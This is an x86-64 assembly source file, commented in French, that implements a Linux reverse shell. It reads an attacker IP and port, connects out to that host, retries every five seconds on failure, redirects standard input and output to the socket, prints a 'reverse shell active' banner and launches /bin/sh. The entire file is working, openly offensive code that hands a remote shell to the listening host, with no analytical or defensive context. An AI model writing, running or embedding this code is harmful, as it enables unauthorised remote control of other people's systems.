section .bss
ip_input    resb 16     ; IP format: 192.168.1.12\n
port_input  resb 6      ; Port format: 4444\n

section .data
sockaddr:
    dw 2                ; AF_INET
    dw 0                ; port (sera injecté dynamiquement)
    dd 0                ; IP (sera injecté dynamiquement)
    dq 0                ; sin_zero

shellpath: db "/bin/sh", 0

prompt_ip:   db "IP ? ", 0
prompt_ip_len equ $ - prompt_ip

prompt_port: db "Port ? ", 0
prompt_port_len equ $ - prompt_port

banner: db 10, 27, "[32m[*] Reverse shell actif. Bienvenue !", 10, 27, "[0m", 10
banner_len equ $ - banner

timespec_5s:
    dq 5
    dq 0

section .text
global _start

_start:
    ; === Lire IP ===
    mov     rax, 1
    mov     rdi, 1
    lea     rsi, [rel prompt_ip]
    mov     rdx, prompt_ip_len
    syscall

    mov     rax, 0
    mov     rdi, 0
    lea     rsi, [rel ip_input]
    mov     rdx, 16
    syscall

    ; === Lire port ===
    mov     rax, 1
    mov     rdi, 1
    lea     rsi, [rel prompt_port]
    mov     rdx, prompt_port_len
    syscall

    mov     rax, 0
    mov     rdi, 0
    lea     rsi, [rel port_input]
    mov     rdx, 6
    syscall

    ; === Convertir port ASCII → int → big endian ===
    xor     rbx, rbx
    xor     rcx, rcx
.convert_port_loop:
    movzx   rax, byte [port_input + rcx]
    cmp     rax, 10
    je      .convert_port_done
    sub     rax, '0'
    imul    rbx, rbx, 10
    add     rbx, rax
    inc     rcx
    cmp     rcx, 5
    jl      .convert_port_loop
.convert_port_done:
    mov     ax, bx
    xchg    al, ah
    mov     word [sockaddr + 2], ax

    ; === Convertir IP ===
    lea     rsi, [rel ip_input]
    lea     rdi, [rel sockaddr + 4]
    xor     rcx, rcx
    xor     rdx, rdx
.parse_octet:
    xor     rbx, rbx
.parse_loop:
    movzx   rax, byte [rsi + rcx]
    cmp     rax, '.'
    je      .write_octet
    cmp     rax, 10
    je      .write_octet
    sub     rax, '0'
    imul    rbx, rbx, 10
    add     rbx, rax
    inc     rcx
    jmp     .parse_loop
.write_octet:
    mov     byte [rdi + rdx], bl
    inc     rcx
    inc     rdx
    cmp     rdx, 4
    jl      .parse_octet

.retry_connection:
    ; === socket() ===
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    ; === connect() ===
    mov     rax, 42
    mov     rdi, r12
    lea     rsi, [rel sockaddr]
    mov     rdx, 16
    syscall
    test    rax, rax
    js      .wait_retry

.success_connection:
    ; === dup2() ===
    mov     rsi, 2
.dup_loop:
    mov     rax, 33
    mov     rdi, r12
    mov     rdx, rsi
    syscall
    dec     rsi
    jns     .dup_loop

    ; === write bannière ===
    mov     rax, 1
    mov     rdi, r12
    lea     rsi, [rel banner]
    mov     rdx, banner_len
    syscall

    ; === récupérer envp depuis la stack ===
    mov     rbx, [rsp]
    lea     rbx, [rsp + 8 + rbx*8]
    add     rbx, 8

    ; === execve("/bin/sh", NULL, envp) ===
    mov     rax, 59
    lea     rdi, [rel shellpath]
    xor     rsi, rsi
    mov     rdx, rbx
    syscall

    ; exit(0)
    mov     rax, 60
    xor     rdi, rdi
    syscall

.wait_retry:
    mov     rax, 3
    mov     rdi, r12
    syscall

    mov     rax, 35
    lea     rdi, [rel timespec_5s]
    xor     rsi, rsi
    syscall

    jmp .retry_connection
